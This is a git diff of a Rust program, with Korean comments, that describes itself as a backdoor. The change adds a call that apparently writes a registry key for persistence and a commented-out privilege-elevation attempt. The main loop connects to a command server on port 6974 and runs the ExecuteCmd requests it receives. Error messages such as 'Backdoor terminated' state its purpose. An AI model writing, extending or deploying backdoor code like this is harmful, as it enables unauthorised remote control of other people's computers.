@@ -3,7 +3,7 @@ mod stprotocol;
 mod structure;
 
 use bstr::ByteSlice;
-use exploits::{Exploits, Malware};
+use exploits::{is_elevated, setup_registry, try_run_as_admin, Exploits, Malware};
 use std::{
     io::{Read, Write},
     thread,
@@ -12,14 +12,33 @@ use stprotocol::{Client, Session};
 use structure::{Detector, Generator, StoneTransferProtocol, StructStone};
 
 fn main() {
-    let client_handler = thread::spawn(|| {
+    // if let p = !is_admin() {
+    //     println!("관리자 권한 없음 {:?}", p);
+    //     if is_elevated() {
+    //         match try_run_as_admin() {
+    //             Ok(_) => {}
+    //             Err(_) => eprintln!("Exploitation failed: Starting backdoor with basic privileges"),
+    //         }
+    //     }
+    // }
+
+    match setup_registry() {
+        Ok(_) => {}
+        Err(_) => eprintln!(
+            "Exploit Failure: Failed to register registry key, resulting in insecure execution."
+        ),
+    }
+
+    let handle_server = thread::spawn(|| {
         event_loop(
             Session::new("127.0.0.1:6974".to_string()),
             StructStone::default(),
         )
     });
 
-    client_handler.join().unwrap();
+    handle_server
+        .join()
+        .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
 }
 
 fn event_loop(mut client: Session, mut packet: StructStone) {
@@ -30,9 +49,9 @@ fn event_loop(mut client: Session, mut packet: StructStone) {
 
         packet = client.receiving(StructStone::default()); // 연결요청후 서버의 응답 대기
 
-        println!("서버 응답타입: {:?}", packet.header_type());
+        println!("서버 응답타입: {:?}", packet.get_type());
 
-        match packet.header_type() {
+        match packet.get_type() {
             // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
             StoneTransferProtocol::ExecuteCmd => {
                 // 타입이 ExecuteCmd 일 경우
@@ -51,7 +70,7 @@ fn event_loop(mut client: Session, mut packet: StructStone) {
                 break;
             } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다
 
-            _ => client.send(packet.stone), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
+            _ => client.send(packet.get_stone()), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
         };
     }
 }
